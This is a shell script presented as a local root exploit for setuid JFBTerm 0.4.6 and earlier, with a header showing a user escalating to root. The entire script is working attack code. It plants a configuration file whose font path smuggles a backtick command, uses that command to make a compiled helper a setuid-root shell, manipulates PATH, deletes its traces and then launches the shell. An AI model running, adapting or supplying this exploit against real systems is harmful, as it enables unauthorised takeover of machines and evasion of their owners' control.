#!/bin/sh
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
# JFBTerm <= 0.4.6 Local Root Exploit (0day)
# Author : 1ndr4 & fr33b34r
# Tested on SULinux 1.5/2.0 - 2010.11.13
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#           * DO NOT DISTRIBUTE *
# !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#
# [user@SuLNX ~]$ id
# uid=500(user) gid=500(user) groups=500(user) context=user_u:system_r:unconfined_t:s0
# [user@SuLNX ~]$ ./jfbterm-ex.sh
# [*] JFBTerm <= 0.4.6 Exploit
# [*] Creating evil configure file.
# [*] Creating evil file.
# [*] Creating root shell.
# [*] Setup PATH Environment.
# [*] Exploit!
# [*] Voila~ RootShell!
# [root@SuLNX ~]# id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=user_u:system_r:unconfined_t:s0
# [root@SuLNX ~]# uname -a
# Linux SuLNX 2.6.18-164.1.el5 #1 SMP Tue Oct 20 18:09:35 KST 2009 i686 i686 i386 GNU/Linux
# [root@SuLNX ~]#
#
TMPDIR="/tmp"
JFBTERM="/usr/bin/jfbterm"
EVILFILE="evil"
EVILCONF="$TMPDIR/evil.cf"
ROOTSHELL="$TMPDIR/sh"
echo "[*] JFBTerm <= 0.4.6 Exploit"
if [ ! -u $JFBTERM ]; then
        echo "[!] $JFBTERM is not suid file"
        exit 0
fi
cd $TMPDIR
echo "[*] Creating evil configure file."
cat > $EVILCONF <<_EOF_
term : jfbterm
fontset : iso646-1973irv,pcf,L,$TMPDIR/\`$EVILFILE\`.gz
_EOF_
echo "[*] Creating evil file."
cat > evil <<_EOF_
#!/bin/sh
chown root.root $ROOTSHELL
chmod 6755 $ROOTSHELL
_EOF_
chmod +x $EVILFILE
touch \`$EVILFILE\`.gz
echo "[*] Creating root shell."
cat > $ROOTSHELL.c <<_EOF_
#include <stdio.h>
#include <unistd.h>
int main() {
setregid(0,0); setreuid(0,0);
setegid(0); seteuid(0);
setgid(0); setuid(0);
initgroups("root", 0);
system("/bin/su -");
}
_EOF_
gcc -o $ROOTSHELL $ROOTSHELL.c
echo "[*] Setup PATH Environment."
export PATH=.:$PATH
rm -rf $ROOTSHELL.c
echo "[*] Exploit!"
$JFBTERM -f $EVILCONF 2>/dev/null
rm -rf \`$EVILFILE\`.gz $EVILFILE $EVILCONF
if [ ! -u $ROOTSHELL ]; then
        echo "[!] Failed, this system not vulnerable."
        rm -rf $ROOTSHELL
        exit 0
else
        echo "[*] Voila~ RootShell!"
        $ROOTSHELL
        exit 0
fi
